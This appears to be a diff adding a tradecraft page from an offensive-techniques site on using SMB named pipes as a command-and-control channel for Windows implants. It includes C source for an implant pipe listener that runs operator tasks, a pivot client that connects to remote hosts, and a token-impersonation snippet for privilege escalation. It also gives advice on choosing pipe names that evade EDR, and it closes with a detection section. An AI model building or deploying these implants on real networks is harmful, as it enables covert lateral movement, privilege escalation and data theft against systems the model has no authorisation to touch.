@@ -1,0 +1,213 @@
+---
+title: SMB Named Pipe C2
+mitre: T1071.002
+category: c2
+group: Covert Channels
+summary: Route implant traffic over SMB named pipes to blend with legitimate file-share traffic.
+platform: [Windows]
+tags: ['C / C++', 'SMB', 'Named Pipes']
+updated: '2026-08-04'
+author: thehackersbrain
+readingTime: 8 min read
+callChain:
+  - call: CreateNamedPipeW (server side)
+    desc: Create a named pipe server endpoint — the implant listens here for operator connections.
+    dll: kernel32
+  - call: ConnectNamedPipe
+    desc: Block until an operator or peer implant connects to the pipe.
+    dll: kernel32
+  - call: ReadFile / WriteFile
+    desc: Exchange tasking and output as raw bytes or framed messages over the pipe.
+    dll: kernel32
+  - call: (pivot) WNetAddConnection2 / CreateFileW (\\host\pipe\name)
+    desc: Peer implant connects to the server pipe over SMB — no direct internet connectivity required.
+    dll: mpr / kernel32
+detections:
+  - src: NETWORK
+    text: SMB traffic to a host that is not a legitimate file server; IPC$ share connections from workstation to workstation.
+  - src: SYSMON EID 17 / 18
+    text: Named pipe creation and connection events; filter on pipe names that don't match known software.
+  - src: BEHAVIOURAL
+    text: A non-svchost, non-lsass process creating a named pipe that receives connections from across the network.
+  - src: WINDOWS EID 5145
+    text: Network share object access audit for the IPC$ share — logs every named pipe connection with account name.
+related:
+  - mitre: T1071.001
+    title: HTTP Beaconing
+    desc: Internet-facing channel; named pipe provides the peer-to-peer leg after internet ingress.
+    href: /techniques/c2/http-beaconing
+  - mitre: T1021.002
+    title: SMB / Windows Admin Shares
+    desc: Named pipes transit over the same SMB transport; share access is the first step.
+  - mitre: T1572
+    title: Protocol Tunneling
+    desc: Named pipes can tunnel arbitrary protocols, including HTTP, for additional obfuscation.
+labKit:
+  - label: pipe_server.c + pipe_client.c
+    href: 'https://github.com/thehackersbrain/maldev-lab-kit'
+  - label: Sigma rule pack
+    href: /detections
+---
+
+import Callout from '../../../components/Callout.astro';
+import CallChain from '../../../components/CallChain.astro';
+import CodeBlock from '../../../components/CodeBlock.astro';
+import DetectionGrid from '../../../components/DetectionGrid.astro';
+import RelatedList from '../../../components/RelatedList.astro';
+
+## Overview
+
+Named pipes are an IPC mechanism that can be accessed locally or across a network via SMB
+(`\\server\pipe\pipename`). Using them as a C2 channel has two practical advantages: SMB is
+almost always allowed between Windows hosts on the same LAN (file sharing), and named pipe
+traffic is encrypted by SMB signing on domain networks — making content inspection harder.
+
+The canonical C2 architecture uses named pipes for **lateral movement legs**: an internet-facing
+implant reaches back to the operator over HTTP, while peer implants on non-internet-routable
+hosts communicate with the anchor over named pipes. Cobalt Strike's `psexec` pivot and
+`link` command use exactly this pattern.
+
+<Callout type="note">
+  Named pipe names are case-insensitive and follow the path `\\.\pipe\name` locally or
+  `\\host\pipe\name` remotely. Windows ships with hundreds of legitimate named pipes; picking
+  a name that mimics an existing one (e.g. `\pipe\svcctl`, `\pipe\lsarpc`) blends with
+  baseline noise but is increasingly flagged by EDR pipe-name allow-listing.
+</Callout>
+
+## The call chain
+
+<CallChain steps={frontmatter.callChain} />
+
+## Reference implementation
+
+### Pipe server (implant listener)
+
+<CodeBlock
+  file="pipe_server.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+#define PIPE_NAME  L"\\\\\\\\.\\\\pipe\\\\msagent_rpc"
+#define PIPE_BUFSIZE 65536
+
+void pipe_server_loop(void) {
+    for (;;) {
+        HANDLE pipe = CreateNamedPipeW(
+            PIPE_NAME,
+            PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED,
+            PIPE_TYPE_MESSAGE | PIPE_READMODE_MESSAGE | PIPE_WAIT,
+            PIPE_UNLIMITED_INSTANCES,
+            PIPE_BUFSIZE, PIPE_BUFSIZE,
+            0, NULL);
+
+        if (pipe == INVALID_HANDLE_VALUE) break;
+
+        // Block until a client connects
+        ConnectNamedPipe(pipe, NULL);
+
+        // Read a task from the operator/peer
+        BYTE buf[PIPE_BUFSIZE];
+        DWORD read = 0;
+        ReadFile(pipe, buf, sizeof buf, &read, NULL);
+
+        // Dispatch the task and write back results
+        BYTE result[PIPE_BUFSIZE];
+        DWORD result_len = dispatch(buf, read, result);
+        DWORD written = 0;
+        WriteFile(pipe, result, result_len, &written, NULL);
+
+        FlushFileBuffers(pipe);
+        DisconnectNamedPipe(pipe);
+        CloseHandle(pipe);
+    }
+}`}
+/>
+
+### Pipe client (pivot / operator side)
+
+<CodeBlock
+  file="pipe_client.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`#include <windows.h>
+
+// Connect to a named pipe on a remote host over SMB
+HANDLE connect_pipe(const wchar_t *host, const wchar_t *pipe_name) {
+    wchar_t path[256];
+    swprintf(path, 256, L"\\\\\\\\%s\\\\pipe\\\\%s", host, pipe_name);
+
+    // Wait for the pipe to be available (retry loop)
+    while (!WaitNamedPipeW(path, 5000));
+
+    HANDLE h = CreateFileW(path,
+                           GENERIC_READ | GENERIC_WRITE,
+                           0, NULL, OPEN_EXISTING,
+                           FILE_FLAG_OVERLAPPED, NULL);
+    if (h == INVALID_HANDLE_VALUE) return NULL;
+
+    // Switch to message mode
+    DWORD mode = PIPE_READMODE_MESSAGE;
+    SetNamedPipeHandleState(h, &mode, NULL, NULL);
+    return h;
+}
+
+void send_task(HANDLE pipe, const BYTE *task, DWORD len) {
+    DWORD written;
+    WriteFile(pipe, task, len, &written, NULL);
+
+    BYTE result[65536];
+    DWORD read;
+    ReadFile(pipe, result, sizeof result, &read, NULL);
+    // process result...
+}`}
+/>
+
+## Pipe naming strategy
+
+| Approach | Example | Risk |
+|---|---|---|
+| Mimic a Windows pipe | `\pipe\svcctl` | Allow-listed by EDR; collision risk |
+| Random GUID | `\pipe\{a3f2c1d4-...}` | Stands out; no baseline |
+| Mimic software vendor | `\pipe\chrome.sync` | Depends on installed software baseline |
+| Random alphanumeric | `\pipe\msagent_rpc` | Moderate; no clear purpose |
+
+Cobalt Strike's default pipe names (`\pipe\msagent_0`, `\pipe\mojo.*`) are all signatured.
+Custom pipe names that mimic legitimate Windows inter-process communication reduce the
+signature match risk but still appear in Sysmon EID 17/18.
+
+## Impersonation via pipe
+
+A named pipe server can impersonate the connecting client with `ImpersonateNamedPipeClient`,
+gaining that client's security token. This is a privilege escalation primitive when the
+connecting client runs at a higher privilege level than the pipe server.
+
+<CodeBlock
+  file="pipe_impersonate.c"
+  label="C"
+  lang="c"
+  class="mb-7.5"
+  code={`// After ConnectNamedPipe — impersonate the connecting client
+ImpersonateNamedPipeClient(pipe);
+
+// Now running with client's token — open resources they can access
+HANDLE f = CreateFileW(L"C:\\\\secret\\\\data.txt",
+                       GENERIC_READ, 0, NULL, OPEN_EXISTING, 0, NULL);
+
+RevertToSelf();  // drop impersonation`}
+/>
+
+## Detection
+
+<DetectionGrid items={frontmatter.detections} />
+
+Windows EID 5145 is the most comprehensive audit point: it logs every named pipe connection
+(as a share object access to IPC$) including the connecting account and source address.
+Combined with a named pipe allow-list, it can fire on any unexpected pipe name accessed from
+an unexpected source.
+
+## Variants & related
+
+<RelatedList items={frontmatter.related} />
